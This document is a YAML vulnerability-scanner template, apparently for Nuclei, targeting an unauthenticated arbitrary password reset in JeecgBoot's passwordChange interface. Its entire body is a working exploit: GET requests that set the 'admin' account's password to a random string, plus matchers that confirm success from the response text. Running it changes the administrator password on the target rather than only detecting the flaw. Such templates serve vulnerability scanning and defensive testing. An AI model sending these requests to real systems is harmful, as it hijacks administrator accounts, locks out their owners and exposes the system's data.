id: jeecg-boot-passwordchange-reset-any-password

info:
  name: Jeecg-boot passwordChange - Reset Any Password
  author: qwtd
  severity: high
  description: |
    The JeecgBoot system interface passwordChange arbitrary user password reset vulnerability can be exploited by unauthenticated remote attackers to reset the administrator account password, thereby taking over the system backend and causing information leakage, resulting in the system being in an extremely insecure state.
  reference:
    - https://mp.weixin.qq.com/s/G5DiGrVbYKmftBLJ06NmQg
  tags: Jeecg-Boot

http:
  - method: GET
    path:
      - "{{BaseURL}}/jeecg-boot/sys/user/passwordChange?username=admin&password={{randstr}}&smscode=&phone="
      - "{{BaseURL}}/sys/user/passwordChange?username=admin&password={{randstr}}&smscode=&phone="

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "密码修改完成"
          - 'success":true'
        condition: and
      - type: status
        status:
          - 200
